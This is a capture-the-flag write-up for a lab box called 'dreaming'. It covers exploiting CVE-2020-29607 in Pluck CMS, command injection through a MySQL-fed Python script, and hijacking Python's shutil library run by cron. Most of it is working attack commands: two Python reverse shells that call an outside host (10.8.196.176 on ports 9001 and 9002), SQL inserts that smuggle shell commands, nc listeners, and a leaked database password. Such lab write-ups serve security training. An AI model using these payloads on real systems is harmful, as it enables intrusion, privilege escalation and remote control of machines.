# dreaming
Solve the riddle that dreams have woven.


## 1. lucien flag

on http://MACHINE_IP/app/pluck-4.7.13/ runs https://github.com/pluck-cms/pluck. To access the admin panel you need to guess the password which is "password". The pluck version 4.7.13 has an RCE vulnerability - CVE-2020-29607, for which there is an exploit available at exploit-db. Just change the ip, port, password in the script, and then try to view the uploaded image in the webapp, which will trigger the webshell inside the image. <br>
https://nvd.nist.gov/vuln/detail/CVE-2020-29607 <br>
https://www.exploit-db.com/exploits/49909

the password for the lucien user can be found in /opt/test.py.

## 2. death flag
the /home/death/getDreams.py script is not viewable but there is a copy in /opt/getDreams.py, which has an command injection vulnerability:
```python
# Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)   # <-- vulnerability 
                print(shell)
```


create reverse shell script, insert it into the library mysql DB, the login is in the bash history of the lucien user:
```bash
# just output the flag without reverse shell:
mysql -u lucien -plucien42DBPASSWORD -Dlibrary -e "insert into dreams (dreamer, dream) values ('hacker3', '; cat ~/death_flag.txt');"

# create /tmp/reverse.sh:
export RHOST="10.8.196.176";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

# make it executable:
chmod +x /tmp/reverse

# insert execution of /tmp/reverse.sh into DB
mysql -ulucien -Dlibrary -plucien42DBPASSWORD -e "insert into dreams values ('hacker', dream='\; /tmp/reverse')"

# to check mysql table:
mysql -ulucien -Dlibrary -plucien42DBPASSWORD -e "select * from dreams;"

# start listener on attacking host:
nc -nvlp 9001

# execute /home/death/getDreams.py as death and trigger reverse shell:
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

## 3. morpheus flag

/home/morpheus/restore.py:
```python
from shutil import copy2 as backup  # <-- loads shutil library on which death user has write access

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

when looking with the lucien user at /var/log/syslog you see that /home/morpheus/restore.py gets executed every minute:
```log
Dec  1 16:00:01 dreaming CRON[65454]: (morpheus) CMD (/usr/bin/python3.8 /home/morpheus/restore.py)
Dec  1 16:00:01 dreaming CRON[65453]: (CRON) info (No MTA installed, discarding output)
Dec  1 16:01:01 dreaming CRON[65458]: (morpheus) CMD (/usr/bin/python3.8 /home/morpheus/restore.py)
Dec  1 16:01:01 dreaming CRON[65457]: (CRON) info (No MTA installed, discarding output)
```

To exploit this write another reverse shell at the top of the malicious library:
```bash
# find the shutil library file in the filesystem:
find / -name shutil* 2>/dev/null
# -rw-rw-r-- 1 root death 51314 Dec  1 16:01 /usr/lib/python3.8/shutil.py

# insert at the top of /usr/lib/python3.8/shutil.py
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.196.176",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

# On attacking machine start an listener:
nc -nlvp 9002
```



